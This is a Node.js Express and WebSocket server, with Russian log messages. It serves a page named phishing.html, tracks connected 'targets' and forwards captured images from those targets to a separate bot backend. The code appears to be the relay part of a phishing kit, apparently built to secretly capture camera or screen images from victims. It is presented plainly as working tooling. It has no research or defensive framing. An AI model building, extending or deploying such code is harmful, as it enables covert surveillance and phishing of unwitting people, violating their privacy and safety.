const express = require('express');
const path = require('path');
const WebSocket = require('ws');
const http = require('http');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const target = url.searchParams.get('target');

    if (!target) {
        ws.close();
        return;
    }

    clients.set(target, ws);
    console.log(`🔗 Подключен: ${target}`);

    // Регистрация в bot.js
    fetch(`http://localhost:${process.env.SERVER_PORT || 3000}/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target })
    }).catch(() => {});

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
            }
        } catch (e) {}
    });

    ws.on('close', () => {
        clients.delete(target);
        console.log(`❌ Отключен: ${target}`);
    });
});

app.post('/capture', (req, res) => {
    const { target, image, type } = req.body;
    if (!target || !image) return res.status(400).send('Missing');

    fetch(`http://localhost:${process.env.SERVER_PORT || 3000}/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, image, type })
    })
    .then(r => r.json())
    .then(data => res.json(data))
    .catch(() => res.status(500).send('Proxy error'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'phishing.html'));
});

const WS_PORT = process.env.WS_PORT || 3001;
server.listen(WS_PORT, () => {
    console.log(`🔌 WebSocket на порту ${WS_PORT}`);
});
